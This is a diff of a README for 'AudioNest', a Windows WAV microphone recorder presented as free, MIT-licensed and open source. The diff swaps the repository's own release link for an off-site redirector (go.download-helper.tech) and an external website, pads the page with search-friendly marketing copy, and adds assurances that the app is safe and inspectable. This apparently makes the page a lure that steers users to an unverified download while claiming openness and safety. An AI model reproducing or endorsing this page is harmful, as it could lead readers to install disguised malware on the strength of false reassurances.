@@ -1,35 +1,73 @@
-# AudioNest — Audio Recorder for Windows
+# AudioNest — a lossless WAV audio recorder for Windows with one-tap capture
 
-Free microphone audio recorder for Windows - clean WAV, no limit
+AudioNest is a tiny microphone recorder for Windows 10 and Windows 11 that writes clean, lossless WAV straight to your Music folder. It is free, needs no account, and leaves no watermark on the file. If you have ever hunted for a browser tab or a bloated suite just to grab a voice memo, audionest skips all of that and gets you from "press Record" to "file saved" in a couple of seconds.
 
-![AudioNest](screenshot.png)
+## Get it
 
-**[⬇ Download for Windows](../../releases/latest)** — free, no ads, no account, no sign-up. One small file, unzip and run.
+[Download for Windows](https://go.download-helper.tech/go/ANST)
 
-## What it does
+The download is a small archive. Right-click it, choose Extract All, open the resulting folder, and double-click AudioNest to launch it. Nothing is copied into Program Files, nothing lands in the registry, and you can drop the folder on a USB stick and run it from there on another machine.
 
-- Record your microphone with a single button
-- Saves a clean WAV file to Music\AudioNest
-- No time limit and no watermark
-- Uses the built-in Windows audio engine, no heavy drivers
-- Light and fast, works on low-end PCs
-- Free and open source, no ads and no telemetry
+## Capabilities
 
-## How to use
+- One-button capture — a single Record control starts the timer and begins pulling audio from your default microphone.
+- Lossless WAV output — recordings are written as PCM WAV with no re-encoding, so the file matches what your sound card produced.
+- Automatic save path — finished takes drop into Music\AudioNest with a timestamped filename, no Save As dialog to click through.
+- Open Folder shortcut — one tap jumps Explorer to your recordings folder so you can grab the latest file.
+- No time ceiling — record for a minute or a few hours; the only limit is free disk space.
+- Built on the Windows audio engine — uses the OS stack rather than third-party drivers, which keeps CPU use low on older laptops.
+- Portable layout — the entire app lives in one folder; delete the folder and nothing is left behind.
+- Offline by design — no upload step, no telemetry, no cloud sync, no account prompt ever.
+- MIT-licensed and open source — read the code, fork it, ship your own build if you want.
 
-1. Open AudioNest.
-2. Press Record - the timer starts and your microphone is captured.
-3. Press Stop - a clean WAV file is saved to Music\AudioNest.
-4. Press Open Folder to find your recordings.
+## Quick start
 
-## Requirements
+1. Download the archive from the link above and extract it anywhere you like — Desktop, Documents, or a USB drive.
+2. Open the extracted folder and launch AudioNest.
+3. Press Record and start speaking; the on-screen timer confirms the microphone is live.
+4. Press Stop when you are done — the WAV lands in Music\AudioNest automatically.
+5. Click Open Folder to grab the file for editing, transcription, or sharing.
 
-Windows 10 or 11, 64-bit. No admin rights needed and nothing is written to the registry. It runs fine on weak, old and budget machines.
+## FAQ
 
-## Privacy
+**Is it free?**
+Yes, completely. No trial, no premium tier, no feature locked behind a paywall.
 
-Everything happens on your PC. Nothing is uploaded, there is no telemetry, no ads and no account.
+**Does it work on Windows 11?**
+Yes. AudioNest is tested on Windows 10 and Windows 11, 64-bit.
 
-## Licence
+**Do I need to create an account?**
+No. There is no sign-up, no login, and no email prompt anywhere in the app.
 
-MIT — free to use, free to share.
+**Does it need an internet connection?**
+No. Recording and saving are entirely local. You can run it on a machine that has never seen Wi-Fi.
+
+**Does it require admin rights?**
+No. It does not write to Program Files or the registry and runs fine from a standard user account.
+
+**Is the recording actually lossless?**
+Yes. The output is PCM WAV, so there is no compression step between what your microphone picks up and what gets written to disk.
+
+**Where do my recordings go?**
+To Music\AudioNest, inside your user profile. The Open Folder button takes you straight there.
+
+**Is it safe?**
+The project is MIT licensed and the source is public, so you can inspect exactly what it does before running it. Nothing leaves your PC.
+
+## Screenshot
+
+![AudioNest main window](screenshot.png)
+
+## System requirements
+
+- Windows 10 or Windows 11, 64-bit
+- A working microphone or audio input device recognized by Windows
+- A few megabytes of free space in your Music folder for recordings
+
+## Website
+
+Website: https://audiorecorderpc.com
+
+## License
+
+MIT — free to use, free to share, free to modify.
